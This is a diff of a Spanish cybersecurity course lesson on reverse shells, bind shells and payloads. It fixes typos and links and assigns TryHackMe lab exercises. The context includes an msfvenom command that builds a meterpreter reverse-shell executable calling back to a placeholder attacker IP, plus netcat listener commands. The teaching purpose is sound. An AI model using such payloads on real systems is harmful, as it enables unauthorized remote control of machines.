@@ -1,7 +1,7 @@
 ---
 title: Una revisión de las shells
 
-description: Explicación teórica reverse shell, bind shell, paylods, webshells. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES Severo Ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.
+description: Explicación teórica reverse shell, bind shell, payloads, webshells. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES Severo Ochoa Elche. Hacking ético, incidentes de seguridad, puesta en producción segura.
 ---
 
 ## ¿Qué es una shell?
@@ -29,7 +29,7 @@ En ciberseguridad, nos referimos comúnmente a una sesión shell específica que
 
 **<u>Ejemplo**</u>
 
-Netcat es una herramienta que soporta múltiples sistemas oprativos, permite lecturas y escrituras a través de la red. 
+Netcat es una herramienta que soporta múltiples sistemas operativos, permite lecturas y escrituras a través de la red. 
 
 El atacante utiliza Netcat para escuchar en el puerto 4444:
 
@@ -102,10 +102,10 @@ nc -lvp 4444 # escucha en el puerto 4444 cualquier conexión entrante
 
 - **Payload de shell inversa:** Diseñado para iniciar una conexión saliente desde la máquina objetivo de vuelta al atacante.
 - **Payload para bind shell:** Configurar un oyente en el objetivo para que el atacante se conecte.
-- **Payloads en scripts:** Los payloads personalizadas también pueden escribirse en lenguajes de scripting como Bash, Python, PowerShell o incluso JavaScript, dependiendo del objetivo y del contexto del ataque.
+- **Payloads en scripts:** Los payloads personalizados también pueden escribirse en lenguajes de scripting como Bash, Python, PowerShell o incluso JavaScript, dependiendo del objetivo y del contexto del ataque.
 
 ##### Usando Metasploit para Payloads
-Metasploit provee payloads pre-construidos que pueden ser usados para generar reverse o bind shells.
+Metasploit proporciona payloads preconstruidos que pueden utilizarse para generar reverse o bind shells.
 
   Ejemplo de comando: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o shell.exe`.
 
@@ -140,9 +140,9 @@ Metasploit provee payloads pre-construidos que pueden ser usados para generar re
    
       - **Atacante (Listener)**:
        ```bash
-       nc -lvp 4444
+       nc -lvnp 4444
        ```
-       La opción **-l** le indica a netcat que espere una conexión, **-v** activa la salida detallada del comando, **-n** impide que las conexiones hagan uso de una búsqueda DNS (no se resolverá ningún nombre, se utilizarán IPs). Finalmente la opción **-p** indica el puerto en el que se escuchará en espera de conexciones entrantes.
+       La opción **-l** le indica a netcat que espere una conexión, **-v** activa la salida detallada del comando, **-n** impide que las conexiones hagan uso de una búsqueda DNS (no se resolverá ningún nombre, se utilizarán IPs). Finalmente la opción **-p** indica el puerto en el que se escuchará en espera de conexiones entrantes.
 
        - **Víctima (Payload)**:
        ```bash
@@ -187,10 +187,10 @@ Metasploit provee payloads pre-construidos que pueden ser usados para generar re
 1. Realizar la máquina [**Vulnversity** en TryHackMe](https://tryhackme.com/r/room/vulnversity). Se trata de una máquina guiada donde repasamos fases que ya hemos visto: escaneo, enumeración y explotación mediante vulnerabilidad. Finalmente veremos una forma de obtener una shell inversa utilizando PHP. **NO HACER LA PARTE DE ESCALADA DE PRIVILEGIOS**.
 
 2. Realizar la máquina [**Thomson** en TryHackMe](https://tryhackme.com/r/room/bsidesgtthompson). Se trata de una máquina no guiada donde tras la fase de escaneo y enumeración debéis conseguir acceso a un famoso servidor de aplicaciones y tras ello crear con *msfvenom* una shell inversa en formato *.war*, que se desplegará en dicho servidor.
-    Al acceder al *.war* desplegado, se establecerá nuestra conexión inversa. Esta página os puede resultar de inmensa ayuda: [https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom)
+    Al acceder al *.war* desplegado, se establecerá nuestra conexión inversa. Esta página os puede resultar de inmensa ayuda: [https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom](https://hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html)
 
 3. Realizar las fases que os marco en la imagen de abajo de la máquina [**RootMe** en TryHackMe](https://tryhackme.com/r/room/rrootme). 
 
     ![](./img/rootme.png)
 
-    En este caso debéis escanear con nmap, descubrir (mediante *gobuster* o *ffuf*) un directorio donde podáis subir archivos y, una vez en él, subir una reverse shell en formato ***.phtml***. Podéis bajar cualquier shell prefabricada en PHP o generarla vosotros con ayuda de [esto](https://www.revshells.com/) o de [esto](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux#php).
+    En este caso debéis escanear con nmap, descubrir (mediante *gobuster* o *ffuf*) un directorio donde podáis subir archivos y, una vez en él, subir una reverse shell en formato ***.phtml***. Podéis bajar cualquier shell prefabricada en PHP o generarla vosotros con ayuda de [esto](https://www.revshells.com/) o de [esto](https://hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html).
